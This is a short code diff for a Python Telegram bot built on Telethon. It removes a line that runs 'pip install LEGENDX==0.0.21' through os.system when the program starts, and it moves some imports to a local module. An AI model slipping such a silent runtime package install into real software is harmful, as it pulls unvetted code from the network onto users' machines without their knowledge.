@@ -4,12 +4,10 @@ import os
 import asyncio
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-os.system("pip install LEGENDX==0.0.21")
-try:
-  from DaisyX import bot 
-except:
-  pass
-from LEGENDX import devs, id, ID
+
+from DaisyX import bot 
+
+from Assist import devs, id, ID
 API_ID = os.environ.get("APP_ID", None)
 API_HASH = os.environ.get("API_HASH", None)
 token = os.environ.get("BOT_TOKEN", None)
